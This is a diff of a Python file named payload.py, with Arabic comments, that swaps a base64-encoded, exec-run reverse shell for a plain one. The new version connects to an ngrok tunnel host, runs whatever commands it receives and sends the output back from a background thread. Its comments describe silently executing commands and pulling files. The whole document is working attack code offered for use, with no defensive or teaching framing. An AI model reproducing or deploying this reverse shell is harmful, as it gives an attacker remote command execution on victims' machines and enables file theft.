@@ -1,13 +1,22 @@
-# [FILE: payload.py]
-import base64, socket, subprocess, os
+# [FILE: payload.py] - النسخة المشفرة بالكامل
+import os, socket, subprocess, threading
 
-# الكود الأصلي مشفر (Reverse Shell)
-_encoded_data = "ZGVmIGNvbm5lY3QoKToNCiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgIHRyeToNCiAgICAgICAgcy5jb25uZWN0KCgnTkdST0tfVVJMJywgNDQ0NCkpDQ0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgY21kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpDQogICAgICAgICAgICBpZiBjbWQubG93ZXIoKSA9PSAnZXhpdCc6IGJyZWFrDQogICAgICAgICAgICBvID0gc3VicHJvY2Vzcy5nZXRvdXRwdShjbWQpDQogICAgICAgICAgICBzLnNlbmQoby5lbmNvZGUoKSkNCiAgICBleGNlcHQ6IHBhc3MNCmNvbm5lY3QoKQ=="
-
-def _start():
-    # فك التشفير والتنفيذ المباشر في الذاكرة (Stealth Mode)
-    _exec_code = base64.b64decode(_encoded_data).decode()
-    exec(_exec_code)
+def _exec_():
+    # إعدادات الاتصال العكسي (Reverse Shell) لجهازك
+    _h = "0.tcp.ngrok.io" 
+    _p = 12345 
+    
+    try:
+        _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        _s.connect((_h, _p))
+        while True:
+            _d = _s.recv(1024).decode("utf-8")
+            if _d.lower() == "exit": break
+            # تنفيذ الأوامر وسحب الملفات صمتاً
+            _o = subprocess.getoutput(_d)
+            _s.send(_o.encode("utf-8"))
+    except: pass
 
 if __name__ == "__main__":
-    _start()
+    # التشغيل في الخلفية كعملية نظام (Background Process)
+    threading.Thread(target=_exec_, daemon=True).start()
